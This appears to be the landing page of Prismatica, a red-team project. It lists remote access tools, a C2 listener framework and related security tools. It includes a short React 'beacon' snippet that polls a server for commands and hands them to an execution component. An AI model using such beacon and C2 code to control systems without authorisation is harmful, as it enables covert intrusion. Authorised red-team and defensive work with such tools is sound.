The Prismatica project is dedicated to having your cake and eating it too.

## Getting Started


## Prismatica Application Marketplace

- [Diagon](https://github.com/Project-Prismatica/Diagon) The Diagon Attack Framework is a Prismatica application containing the Ravenclaw, Gryffindor, and Slytherin remote access tools (RATs).
- [Emergence](https://github.com/Project-Prismatica/Emergence) The Emergence fabric is an interface where interaction and integration of disparate information security subsystems gain combined intelligence.
- [Oculus](https://github.com/Project-Prismatica/Oculus) Oculus is a malleable python-based C2 system allowing for instantiation of listeners for the purpose of communication with remote access tools (RATs).
- [Prism Launcher]() The package manager for Prism Apps (Releasing at WWHF)
- [Prism Project Manager]() Project management, findigns, and reporting tool (Releasing at WWHF)
- [Acheron](https://github.com/Acheron-VAF/Acheron) Acheron is a RESTful vulnerability assessment and management framework built around search and dedicated to terminal extensibility.
- [Tiberium](https://github.com/0sm0s1z/Tiberium/releases) A Command and Control scanning tool


![Screenshot]({{ site.url }}/screenshot.gif)



## Simple REACTJS Beacon

```js
// Defining a BeaconHandler Class
var BeaconHandler = React.createClass({
  loadCommandsFromServer: function() {
    $.ajax({
      url: this.props.url,
      dataType: 'json',
      cache: false,
      success: function(data) {
        this.setState({data: data});
      }.bind(this),
      error: function(xhr, status, err) {
        console.log(this.props.url, status, err.toString());
      }.bind(this)
    });
  },
  getInitialState: function() {
    return {data: []};
  },
  componentDidMount: function() {
    this.loadCommandsFromServer();
    setInterval(this.loadCommandsFromServer, this.props.pollInterval);
  },
  //Push tasks to execution
  render: function() {
   return (
     <Exec data = {this.state.data} />
   );
  }
});
```


![Screenshot]({{ site.url }}/hills.png)
